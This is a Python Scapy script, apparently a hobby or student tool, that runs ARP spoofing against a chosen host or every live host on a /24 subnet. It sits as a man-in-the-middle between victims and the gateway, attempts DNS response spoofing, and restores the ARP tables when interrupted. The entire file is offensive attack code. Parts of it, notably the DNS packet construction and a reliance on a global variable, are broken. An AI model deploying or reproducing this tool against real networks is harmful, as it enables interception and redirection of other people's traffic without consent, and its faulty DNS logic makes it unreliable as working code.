from scapy.layers.l2 import *
from scapy.sendrecv import send, sniff
from scapy.layers.dns import DNS , DNSRR , IP , UDP
import time
import sys




def spoofarpcache(targetip, targetmac, sourceip):
    send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
    print("yo")

def sendFakeDNS(tpr):
    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(qname="61.13.148.37"))
    send(dnsResPacket)

def DNSSpoofing():
    sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)



def MultiSniffing(ippasserelle):
    ipt = {}
    ip = ".".join(ippasserelle.split(".")[:-1]) + "."
    for num in range(1, 255):
        if str(arping(ip + str(num))[0])[-2] != "0":
            ipt[ip + str(num)] = getmacbyip(ip + str(num))
            SingleSniffing(ip + str(num), ippasserelle)
    print(ipt)


def SingleSniffing(targetip, passerelleip):
    if str(arping(targetip)[0])[-2] != "0" :
        targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
        gatewayip = passerelleip
        gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
        try:
            print("Sending spoofed ARP responses")
            while True :
                spoofarpcache(targetip, targetmac, gatewayip)
                spoofarpcache(gatewayip, gatewaymac, targetip)
                DNSSpoofing()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("ARP spoofing stopped")

            restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
            restorearp(targetip, targetmac, gatewayip, gatewaymac)

            quit()
    else:
        print("Ip not reachable")

if len(sys.argv) == 1:
    print("Please can you enter the target IP Adress and Passerelle IP")
elif len(sys.argv) == 2:
    if sys.argv[1] == "-h":
        print("Use '-s [targetIp] [passerelleIP]'\n Or '-m [passerelleIP]'")
    elif sys.argv[1] == "-s":
        print("Please can you enter the target IP Adress and Passerelle IP")
    elif sys.argv[1] == "-m":
        print("Please can you enter the Passerelle IP")
    else:
        print("Please can you enter the Passerelle IP")
elif len(sys.argv) == 3:
    if sys.argv[1] == "-s":
        print("Please can you enter the Passerelle IP")
    elif sys.argv[1] == "-m":
        MultiSniffing(sys.argv[2])
    else:
        targetip = sys.argv[1]
        SingleSniffing(sys.argv[1], sys.argv[2])
elif len(sys.argv) == 4:
    if sys.argv[1] == "-s":
        targetip = sys.argv[2]
        SingleSniffing(sys.argv[2], sys.argv[3])
    else:
        print("To many arguments")
else:
    print("To many arguments")


